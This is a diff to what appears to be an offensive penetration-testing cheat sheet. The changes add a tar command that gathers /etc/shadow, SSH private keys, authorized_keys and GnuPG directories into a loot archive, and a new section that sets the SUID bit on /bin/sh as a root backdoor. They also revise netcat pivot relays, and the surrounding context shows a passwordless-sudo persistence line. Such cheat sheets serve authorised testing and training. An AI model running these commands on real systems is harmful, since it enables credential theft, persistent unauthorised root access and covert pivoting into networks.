@@ -131,6 +131,7 @@ Other great cheetsheets:
   - [8.6. Create Windows Backdoor Service](#86-create-windows-backdoor-service)
 - [9. Linux Persistence](#9-linux-persistence)
   - [9.1. Grant passwordless sudo access](#91-grant-passwordless-sudo-access)
+  - [Setting SUID bit](#setting-suid-bit)
 - [10. Pivoting and Redirection](#10-pivoting-and-redirection)
   - [10.1. SSH Tunnels](#101-ssh-tunnels)
   - [10.2. SOCKS Proxies and proxychains](#102-socks-proxies-and-proxychains)
@@ -2470,12 +2471,15 @@ dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\
 tar zcf loot.tar.gz \
 /etc/passwd{,-} \
 /etc/shadow{,-} \
-/etc/ssh/ssh_host_* \
+/etc/ssh/ssh_config \
+/etc/ssh/sshd_config \
 /home/*/.ssh/id* \
+/home/*/.ssh/authorized_keys* \
 /home/*/.gnupg \
 /root/.gnupg \
 /root/.ssh/id* \
-/root/network-secret.txt \
+/root/.ssh/authorized_keys* \
+/root/network-secret*.txt \
 /root/proof.txt
 ```
 
@@ -2620,6 +2624,17 @@ Edit the `/etc/sudoers` file to have the following line:
 
 ```
 myuser ALL=(ALL) NOPASSWD: ALL
+```
+
+## Setting SUID bit
+
+If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
+or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more),
+you can use those to give yourself a root shell. This is a kind of privesc
+backdoor.
+
+```sh
+sudo chmod u+s /bin/sh
 ```
 
 # 10. Pivoting and Redirection
@@ -2827,13 +2842,13 @@ cd c:\temp
 :: create relay.bat to connect to victim service
 echo nc $VICTIM_IP VICTIM_PORT > relay.bat
 :: Set up pivot listener (-L is persistent listener)
-nc –L –p LISTEN_PORT –e relay.bat
+nc –L -p LISTEN_PORT –e relay.bat
 ```
 
 ```sh
 # LINUX pivot
-mkfifo /tmp/backpipe
-nc –l –p LISTEN_PORT 0<backpipe | nc $VICTIM_IP VICTIM_PORT | tee backpipe
+mkfifo /tmp/bp  # backpipe
+nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
 ```
 
 # 11. Miscellaneous
